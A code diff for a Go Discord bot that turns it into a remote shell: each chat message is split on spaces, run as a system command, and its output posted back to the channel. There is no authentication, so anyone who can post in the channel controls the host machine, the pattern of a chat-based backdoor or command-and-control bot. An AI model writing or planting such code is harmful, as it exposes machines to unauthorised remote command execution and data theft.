@@ -7,6 +7,7 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"strings"
 	"syscall"
 
 	"github.com/bwmarrin/discordgo"
@@ -16,23 +17,37 @@ func onMessageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	if m.Author.ID == s.State.User.ID {
 		return
 	}
+	execCommand(s, m)
 
 }
 
-func redirectOutput(pipe *io.Reader, s *discordgo.Session) {
+func redirectOutput(pipe *io.ReadCloser, s *discordgo.Session, m *discordgo.MessageCreate) {
 	scanner := bufio.NewScanner(*pipe)
 	for scanner.Scan() {
-		scanner.Text()
+		text := scanner.Text()
+		_, err := s.ChannelMessageSend(m.ChannelID, text)
+		if err != nil {
+			fmt.Println(err)
+		}
 	}
 }
 
-func execCommand(command string, args string, stdout chan string, stdin chan string) {
-	cmd := exec.Command(command, args)
+func execCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
+	comAndArg := strings.Split(m.Content, " ")
+	cmd := exec.Command(comAndArg[0], comAndArg[1:]...)
 	outP, err := cmd.StdoutPipe()
 	if err != nil {
 		fmt.Println(err)
 	}
-	outP.Read()
+	go redirectOutput(&outP, s, m)
+	err = cmd.Start()
+	if err != nil {
+		fmt.Println(err)
+	}
+	err = cmd.Wait()
+	if err != nil {
+		fmt.Println(err)
+	}
 }
 
 func main() {
